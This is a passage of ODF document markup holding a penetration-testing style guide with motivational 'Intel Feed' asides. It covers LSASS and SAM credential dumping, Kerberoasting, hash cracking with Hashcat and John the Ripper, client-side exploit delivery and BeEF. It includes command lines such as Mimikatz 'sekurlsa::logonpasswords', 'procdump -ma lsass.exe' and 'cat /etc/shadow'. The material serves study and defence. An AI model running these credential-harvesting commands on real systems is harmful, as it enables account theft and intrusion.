            <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Memory Dumping (Windows - LSASS):</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Mimikatz:</text:span></text:span><text:span text:style-name="T1"> The quintessential Windows credential dumping tool. Can extract plaintext passwords, hashes, Kerberos tickets, and more directly from LSASS memory. Requires SYSTEM privileges. Common commands: </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">privilege::debug</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">sekurlsa::logonpasswords</text:span></text:span><text:span text:style-name="T1">. Often flagged by antivirus/EDR, requiring obfuscation or alternative techniques. (Meterpreter has a </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">load mimikatz</text:span></text:span><text:span text:style-name="T1"> command and specific functions like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">kerberos</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">msv</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">livessp</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">ProcDump (Sysinternals):</text:span></text:span><text:span text:style-name="T1"> Legitimate Microsoft tool used for process debugging. Can be used to dump the LSASS process memory to a file (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">procdump.exe -ma lsass.exe lsass.dmp</text:span></text:span><text:span text:style-name="T1">), which can then be analyzed offline with Mimikatz on an attacker-controlled machine. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Metasploit's </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">hashdump</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1"> / </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">smart_hashdump</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:</text:span></text:span><text:span text:style-name="T1"> Meterpreter commands that attempt to extract hashes from SAM/LSASS. Requires appropriate privileges. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Offline SAM/NTDS.dit Extraction:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P2">Booting from alternative media (live CD/USB) to access the filesystem directly. </text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="T1">Using Volume Shadow Copy Service (VSS) to access locked files on a running system (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">vssadmin</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">shadowcopy</text:span></text:span><text:span text:style-name="T1"> tools). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="T1">Extracting </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">SAM</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">SYSTEM</text:span></text:span><text:span text:style-name="T1"> (contains boot key to decrypt SAM), and </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">SECURITY</text:span></text:span><text:span text:style-name="T1"> registry hives. Use tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">pwdump</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">fgdump</text:span></text:span><text:span text:style-name="T1">, or offline registry parsers. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="T1">For NTDS.dit, requires similar offline access to a Domain Controller or its backup. Use tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">secretsdump.py</text:span></text:span><text:span text:style-name="T1"> (Impacket) or built-in utilities (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ntdsutil</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Linux </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/shadow</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1"> Access:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="T1">Requires root privileges. Simply </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">cat /etc/shadow</text:span></text:span><text:span text:style-name="T1">. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P15"><text:span text:style-name="T1">Combine with </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/passwd</text:span></text:span><text:span text:style-name="T1"> for context using </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">unshadow</text:span></text:span><text:span text:style-name="T1"> utility (part of John the Ripper suite) before feeding to a cracker. </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">unshadow /etc/passwd /etc/shadow &gt; crackable_hashes.txt</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Kerberoasting (Windows Domain Environments)</text:span></text:span></text:p>
        <text:p text:style-name="P1">A technique targeting Active Directory service accounts. Service Principal Names (SPNs) are associated with service accounts and used for Kerberos authentication.</text:p>
        <text:list xml:id="list1694004848232285581" text:style-name="L10">
          <text:list-item>
            <text:p text:style-name="P3">An attacker (with any authenticated domain user account) requests Kerberos service tickets (TGS) for target SPNs from the Domain Controller. </text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P16"><text:span text:style-name="T1">The DC provides the TGS, encrypted with the </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">service account's NTLM password hash</text:span></text:span><text:span text:style-name="T1">. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P3"><text:soft-page-break/>The attacker extracts these encrypted tickets from memory. </text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P3">The encrypted portion containing the service account's hash can be cracked offline using tools like Hashcat or John the Ripper. </text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="T1">This is powerful because it requires only low-level domain access initially and targets potentially high-privilege service accounts whose passwords might be weaker or less frequently changed than standard user accounts. Tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">GetUserSPNs.py</text:span></text:span><text:span text:style-name="T1"> (Impacket), </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">Rubeus</text:span></text:span><text:span text:style-name="T1">, or PowerShell scripts (e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">Invoke-Kerberoast</text:span></text:span><text:span text:style-name="T1">) automate this process.</text:span></text:p>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Credentials are currency in the digital realm. Accessing password storage requires escalation. Memory is often richer than disk. Understand the authentication protocols (NTLM, Kerberos) to exploit their weaknesses. Every harvested credential is a potential key to another door. Be relentless.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 04: Password Cracking ::</text:span></text:span></text:h>
        <text:p text:style-name="P6"><text:span text:style-name="T1">You have the hashes – cryptographic representations of user passwords extracted from SAM, LSASS, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/shadow</text:span></text:span><text:span text:style-name="T1">, or Kerberos tickets. Hashes are one-way functions; you cannot reverse them to get the plaintext password directly. Cracking is the process of finding the original plaintext password (or </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">any</text:span></text:span><text:span text:style-name="T1"> plaintext that produces the same hash – a collision) by systematically generating candidates and hashing them for comparison.</text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Cracking Methodologies</text:span></text:span></text:p>
        <text:list xml:id="list1388041368332620346" text:style-name="L11">
          <text:list-item>
            <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Dictionary Attack:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Concept:</text:span></text:span><text:span text:style-name="T1"> Uses a predefined list of words (a dictionary) – common words, names, places, previous breach passwords, keyboard patterns (qwerty), etc. Each word is hashed and compared against the target hashes. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools:</text:span></text:span><text:span text:style-name="T1"> John the Ripper (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">john</text:span></text:span><text:span text:style-name="T1">), Hashcat (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">hashcat</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Effectiveness:</text:span></text:span><text:span text:style-name="T1"> Highly effective against simple, common passwords. Useless against complex or truly random passwords not found in the dictionary. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Enhancement - Mangling Rules:</text:span></text:span><text:span text:style-name="T1"> Most crackers apply rules to dictionary words – appending numbers/symbols, changing case, substituting characters (e=3, a=@), reversing words. This dramatically increases the candidate pool based on common user password creation patterns. John the Ripper has extensive rule sets (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">--rules</text:span></text:span><text:span text:style-name="T1">). Hashcat also supports rules (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-r rules/best64.rule</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Brute-Force Attack:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Concept:</text:span></text:span><text:span text:style-name="T1"> Systematically tries every possible combination of characters within a defined character set (e.g., lowercase alpha, uppercase alpha, numeric, symbols) up to a certain length. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools:</text:span></text:span><text:span text:style-name="T1"> John the Ripper (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">--incremental</text:span></text:span><text:span text:style-name="T1">), Hashcat (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 3</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Effectiveness:</text:span></text:span><text:span text:style-name="T1"> Guaranteed to find the password </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">eventually</text:span></text:span><text:span text:style-name="T1">, provided the character set and length constraints cover the original password. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Challenge:</text:span></text:span><text:span text:style-name="T1"> Computationally </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">extremely</text:span></text:span><text:span text:style-name="T1"> expensive. The number of possibilities grows exponentially with length and character set size. Cracking long, complex passwords via pure brute-force can take years, decades, or millennia even with powerful hardware. Often impractical beyond short lengths (e.g., &lt; 8-10 characters). </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Mask Attack (Hybrid):</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Concept:</text:span></text:span><text:span text:style-name="T1"> A variation of brute-force where parts of the password structure are known or assumed. For example, knowing a password starts with a capital letter, followed by 5 lowercase letters, then 2 digits (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">?U?l?l?l?l?l?d?d</text:span></text:span><text:span text:style-name="T1">). This significantly reduces the search space compared to pure brute-force. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools:</text:span></text:span><text:span text:style-name="T1"> Hashcat (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 3</text:span></text:span><text:span text:style-name="T1"> with a mask). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Effectiveness:</text:span></text:span><text:span text:style-name="T1"> Very effective if parts of the password pattern can be guessed accurately. Reduces brute-force time dramatically. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Rainbow Table Attack:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Concept:</text:span></text:span><text:span text:style-name="T1"> Uses precomputed tables mapping hashes back to plaintext passwords. Instead of hashing candidates during the cracking process, the cracker looks up the target hash in the table. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Mechanism:</text:span></text:span><text:span text:style-name="T1"> Rainbow tables use complex chains and reduction functions to store vast numbers of hash-to-plaintext mappings relatively efficiently, trading disk space for cracking speed. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools:</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">rcrack</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ophcrack</text:span></text:span><text:span text:style-name="T1">. Requires pre-generated tables specific to the hash algorithm (MD5, NTLM, SHA1, etc.). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Effectiveness:</text:span></text:span><text:span text:style-name="T1"> Extremely fast for hashes covered by the table. Useless if the hash isn't in the table. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P17"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Defense - Salting:</text:span></text:span><text:span text:style-name="T1"> Adding unique, random data (a salt) to each password </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">before</text:span></text:span><text:span text:style-name="T1"> hashing defeats standard rainbow tables. Each unique salt requires a separate rainbow table, making them impractical against properly salted hashes (modern Linux/macOS use salts; NTLM does not inherently, but syskey added protection). </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools of the Trade</text:span></text:span></text:p>
        <text:list xml:id="list2820516253197928229" text:style-name="L12">
          <text:list-item>
            <text:p text:style-name="P18"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">John the Ripper (JtR):</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P4">Highly versatile, cross-platform cracker. </text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P18"><text:span text:style-name="T1">Supports numerous hash types automatically detected from input files </text:span><text:soft-page-break/><text:span text:style-name="T1">(</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/etc/shadow</text:span></text:span><text:span text:style-name="T1">, Pwdump output). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P18"><text:span text:style-name="T1">Modes: </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">single</text:span></text:span><text:span text:style-name="T1"> (default, uses GECOS info + rules), </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">wordlist</text:span></text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">--wordlist=FILE</text:span></text:span><text:span text:style-name="T1">), </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">incremental</text:span></text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">--incremental</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P4">Uses CPU by default. </text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P18"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Hashcat:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P4">Extremely fast, GPU-accelerated cracker. Focuses on raw speed. </text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P18"><text:span text:style-name="T1">Supports a vast number of hash types, specified manually (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-m TYPE</text:span></text:span><text:span text:style-name="T1">). Requires hash format knowledge. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P18"><text:span text:style-name="T1">Modes: Dictionary (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 0</text:span></text:span><text:span text:style-name="T1">), Brute-force/Mask (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 3</text:span></text:span><text:span text:style-name="T1">), Hybrid (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 6</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">-a 7</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P4">Leverages GPUs (NVIDIA/AMD) for massive parallel processing, orders of magnitude faster than CPU cracking for many hash types. </text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P18"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">RainbowCrack Tools (</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">rtgen</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">, </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">rtsort</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">, </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">rcrack</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">):</text:span></text:span><text:span text:style-name="T1"> Used for generating, sorting, and using rainbow tables. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Hardware Acceleration (GPU Cracking)</text:span></text:span></text:p>
        <text:p text:style-name="P1">Modern password cracking heavily relies on GPUs. GPUs contain hundreds or thousands of simple processing cores designed for parallel computation (graphics rendering). This architecture is exceptionally well-suited for the repetitive calculations involved in hashing password candidates. A high-end consumer GPU can attempt billions or even trillions of hashes per second for algorithms like NTLM or MD5, drastically reducing cracking times compared to CPUs. Hashcat is the primary tool leveraging this capability.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Operational Considerations</text:span></text:span></text:p>
        <text:list xml:id="list1821415798949931782" text:style-name="L13">
          <text:list-item>
            <text:p text:style-name="P19"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Hash Type Identification:</text:span></text:span><text:span text:style-name="T1"> Crucial for selecting the right tool/mode. Tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">hashid</text:span></text:span><text:span text:style-name="T1"> can help identify hash types from examples. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P19"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Input Formatting:</text:span></text:span><text:span text:style-name="T1"> Crackers expect specific input formats (e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">user:hash</text:span></text:span><text:span text:style-name="T1"> for JtR, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">hash:salt</text:span></text:span><text:span text:style-name="T1"> for salted formats). Use tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">unshadow</text:span></text:span><text:span text:style-name="T1"> for Linux hashes. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P19"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Time vs. Resources:</text:span></text:span><text:span text:style-name="T1"> Choose the methodology based on available time, hardware (CPU vs. GPU), and hash complexity/salting. Start with dictionary/rules, then move to brute-force/mask for resistant hashes if time permits. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Password hashes are locked doors. Cracking is picking the lock. Dictionary attacks try known keys. Brute-force tries every possible key. Rainbow tables use pre-picked locks. GPU acceleration turns lockpicks into plasma cutters. Know the lock (hash type, salting) before choosing your tool. Time is your most valuable resource.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 05: Client-Side Vulnerability Exploitation ::</text:span></text:span></text:h>
        <text:p text:style-name="P6"><text:span text:style-name="T1">While server-side exploits target listening services, client-side vulnerabilities weaponize user interaction. The target opens a malicious file, visits a compromised website, or clicks a deceptive link, triggering code execution within their own application's context (browser, document reader, email client). This bypasses perimeter defenses by initiating the attack from </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">within</text:span></text:span><text:span text:style-name="T1"> the trusted network boundary.</text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Common Target Applications</text:span></text:span></text:p>
        <text:list xml:id="list2032591655783174276" text:style-name="L14">
          <text:list-item>
            <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Web Browsers (Chrome, Firefox, Edge, Safari):</text:span></text:span><text:span text:style-name="T1"> Complex software with large attack surfaces (JavaScript engines, rendering engines, plugin interfaces, protocol handlers). Vulnerabilities can lead to remote code execution (RCE) simply by visiting a malicious page. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Email Clients (Outlook, Thunderbird):</text:span></text:span><text:span text:style-name="T1"> Handling attachments, rendering HTML emails, processing calendar invites – all potential vectors. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Document Readers (Adobe Reader, Microsoft Office):</text:span></text:span><text:span text:style-name="T1"> Exploits often target parsing libraries for complex file formats (PDF, DOCX, XLSX, PPTX). Macros in Office documents remain a persistent threat vector. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Media Players (VLC, Windows Media Player):</text:span></text:span><text:span text:style-name="T1"> Vulnerabilities in codec handling (parsing audio/video streams) can be exploited. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Exploit Delivery Mechanisms</text:span></text:span></text:p>
        <text:p text:style-name="P1">The exploit code needs to reach the client application.</text:p>
        <text:list xml:id="list4900567110532036735" text:style-name="L15">
          <text:list-item>
            <text:p text:style-name="P21"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Malicious Websites:</text:span></text:span><text:span text:style-name="T1"> Hosting exploit code (often JavaScript-based) directly or redirecting users to exploit kit landing pages. Achieved via phishing links, watering hole attacks, malvertising, or typosquatting. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P21"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Malicious Email Attachments:</text:span></text:span><text:span text:style-name="T1"> Crafting weaponized documents (PDF, Office files with macros) or archives (ZIP, RAR) containing executables disguised as legitimate files. Relies on social engineering to convince the user to open the attachment. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P21"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Compromised Legitimate Files:</text:span></text:span><text:span text:style-name="T1"> Injecting exploit code into otherwise legitimate documents or media files hosted on trusted sites or shared via P2P networks. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Exploit Kits (EKs)</text:span></text:span></text:p>
        <text:p text:style-name="P1">Automated threats that streamline client-side attacks.</text:p>
        <text:list xml:id="list2267113127992645556" text:style-name="L16">
          <text:list-item>
            <text:p text:style-name="P22"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Traffic Direction:</text:span></text:span><text:span text:style-name="T1"> Victims are routed to an EK landing page (via compromised sites, malvertising, phishing). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P22"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Profiling:</text:span></text:span><text:span text:style-name="T1"> The EK profiles the victim's browser, OS, and installed plugins (Flash, Java, Silverlight - less common now but historically major targets). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P22"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Exploit Delivery:</text:span></text:span><text:span text:style-name="T1"> Based on the profile, the EK selects and attempts relevant exploits against detected vulnerabilities. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P22"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Payload Drop:</text:span></text:span><text:span text:style-name="T1"> If an exploit succeeds, the EK delivers the final malware payload (ransomware, banking trojan, backdoor). </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P1">EKs are sophisticated, often employing multiple exploits and obfuscation techniques to evade detection.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Browser Exploitation Framework (BeEF)</text:span></text:span></text:p>
        <text:p text:style-name="P1">A penetration testing tool focused specifically on web browser exploitation.</text:p>
        <text:list xml:id="list5009376739963100598" text:style-name="L17">
          <text:list-item>
            <text:p text:style-name="P23"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Hooking:</text:span></text:span><text:span text:style-name="T1"> BeEF uses a JavaScript "hook" file. When a victim browser visits a page containing the hook (either hosted by the attacker or injected into a compromised site), the browser becomes "hooked." </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P23"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Command &amp; Control:</text:span></text:span><text:span text:style-name="T1"> The attacker uses the BeEF control panel to issue commands to hooked browsers. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P23"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Capabilities:</text:span></text:span><text:span text:style-name="T1"> Browser manipulation, keystroke logging, cookie theft, webcam/microphone access (with user permission prompts), network scanning </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">from the victim's browser</text:span></text:span><text:span text:style-name="T1">, phishing pop-ups, module execution (e.g., attempting further exploits against browser plugins). </text:span></text:p>
          </text:list-item>
        </text:list>
